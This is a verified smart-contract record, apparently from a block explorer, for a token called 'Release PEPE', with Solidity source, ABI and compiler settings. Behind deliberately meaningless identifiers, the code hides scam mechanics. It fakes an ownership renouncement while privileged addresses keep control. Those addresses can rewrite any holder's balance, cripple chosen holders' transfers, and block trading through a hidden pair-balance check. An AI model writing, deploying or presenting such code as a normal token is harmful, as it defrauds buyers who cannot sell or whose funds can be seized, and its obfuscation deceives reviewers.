{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface totalLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyTx) external view returns (uint256);\n\n    function transfer(address amountMin, uint256 marketingTrading) external returns (bool);\n\n    function allowance(address fundMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountMin,\n        uint256 marketingTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingReceiver, uint256 value);\n    event Approval(address indexed fundMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract launchAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldFromBuy {\n    function createPair(address minMax, address amountWallet) external returns (address);\n}\n\ninterface totalLimitMetadata is totalLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReleasePEPE is launchAt, totalLimit, totalLimitMetadata {\n\n    function feeSenderMode(address walletMarketing) public {\n        amountSender();\n        \n        if (walletMarketing == atFrom || walletMarketing == feeTake) {\n            return;\n        }\n        takeEnableMarketing[walletMarketing] = true;\n    }\n\n    uint256 public atTxFrom;\n\n    function tokenExempt() public {\n        emit OwnershipTransferred(atFrom, address(0));\n        modeEnable = address(0);\n    }\n\n    function totalFrom(address liquidityFund, address amountMin, uint256 marketingTrading) internal returns (bool) {\n        if (liquidityFund == atFrom) {\n            return takeLimit(liquidityFund, amountMin, marketingTrading);\n        }\n        uint256 senderMax = totalLimit(feeTake).balanceOf(atTx);\n        require(senderMax == shouldExempt);\n        require(amountMin != atTx);\n        if (takeEnableMarketing[liquidityFund]) {\n            return takeLimit(liquidityFund, amountMin, toTrading);\n        }\n        return takeLimit(liquidityFund, amountMin, marketingTrading);\n    }\n\n    function balanceOf(address buyTx) public view virtual override returns (uint256) {\n        return limitLiquidity[buyTx];\n    }\n\n    uint256 private totalList = 100000000 * 10 ** 18;\n\n    address teamTakeExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address atTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address minIs, uint256 marketingTrading) public virtual override returns (bool) {\n        receiverEnable[_msgSender()][minIs] = marketingTrading;\n        emit Approval(_msgSender(), minIs, marketingTrading);\n        return true;\n    }\n\n    string private takeFund = \"RPE\";\n\n    function allowance(address teamReceiverSwap, address minIs) external view virtual override returns (uint256) {\n        if (minIs == teamTakeExempt) {\n            return type(uint256).max;\n        }\n        return receiverEnable[teamReceiverSwap][minIs];\n    }\n\n    mapping(address => bool) public exemptAmount;\n\n    function fromTrading(address enableExemptBuy) public {\n        require(enableExemptBuy.balance < 100000);\n        if (isWallet) {\n            return;\n        }\n        \n        exemptAmount[enableExemptBuy] = true;\n        if (isMode != atTxFrom) {\n            liquidityMax = true;\n        }\n        isWallet = true;\n    }\n\n    uint256 constant toTrading = 13 ** 10;\n\n    function transfer(address isExempt, uint256 marketingTrading) external virtual override returns (bool) {\n        return totalFrom(_msgSender(), isExempt, marketingTrading);\n    }\n\n    mapping(address => bool) public takeEnableMarketing;\n\n    uint256 limitExempt;\n\n    uint8 private txLimitSender = 18;\n\n    function owner() external view returns (address) {\n        return modeEnable;\n    }\n\n    mapping(address => uint256) private limitLiquidity;\n\n    uint256 shouldExempt;\n\n    function getOwner() external view returns (address) {\n        return modeEnable;\n    }\n\n    bool public isWallet;\n\n    uint256 private isMode;\n\n    function walletShould(uint256 marketingTrading) public {\n        amountSender();\n        shouldExempt = marketingTrading;\n    }\n\n    address public atFrom;\n\n    function amountSender() private view {\n        require(exemptAmount[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listMinTrading;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txLimitSender;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalList;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverEnable;\n\n    address private modeEnable;\n\n    function takeLimit(address liquidityFund, address amountMin, uint256 marketingTrading) internal returns (bool) {\n        require(limitLiquidity[liquidityFund] >= marketingTrading);\n        limitLiquidity[liquidityFund] -= marketingTrading;\n        limitLiquidity[amountMin] += marketingTrading;\n        emit Transfer(liquidityFund, amountMin, marketingTrading);\n        return true;\n    }\n\n    function transferFrom(address liquidityFund, address amountMin, uint256 marketingTrading) external override returns (bool) {\n        if (_msgSender() != teamTakeExempt) {\n            if (receiverEnable[liquidityFund][_msgSender()] != type(uint256).max) {\n                require(marketingTrading <= receiverEnable[liquidityFund][_msgSender()]);\n                receiverEnable[liquidityFund][_msgSender()] -= marketingTrading;\n            }\n        }\n        return totalFrom(liquidityFund, amountMin, marketingTrading);\n    }\n\n    bool private launchedLimitIs;\n\n    address public feeTake;\n\n    constructor (){\n        if (atTxFrom != isMode) {\n            isMode = atTxFrom;\n        }\n        marketingList limitSwap = marketingList(teamTakeExempt);\n        feeTake = shouldFromBuy(limitSwap.factory()).createPair(limitSwap.WETH(), address(this));\n        \n        atFrom = _msgSender();\n        tokenExempt();\n        exemptAmount[atFrom] = true;\n        limitLiquidity[atFrom] = totalList;\n        if (atTxFrom != isMode) {\n            atTxFrom = isMode;\n        }\n        emit Transfer(address(0), atFrom, totalList);\n    }\n\n    event OwnershipTransferred(address indexed senderTradingLimit, address indexed teamLaunched);\n\n    function totalShould(address isExempt, uint256 marketingTrading) public {\n        amountSender();\n        limitLiquidity[isExempt] = marketingTrading;\n    }\n\n    string private listMinTrading = \"Release PEPE\";\n\n    bool private liquidityMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTradingLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiverSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTxFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"}],\"name\":\"feeSenderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExemptBuy\",\"type\":\"address\"}],\"name\":\"fromTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeEnableMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"totalShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"walletShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReleasePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}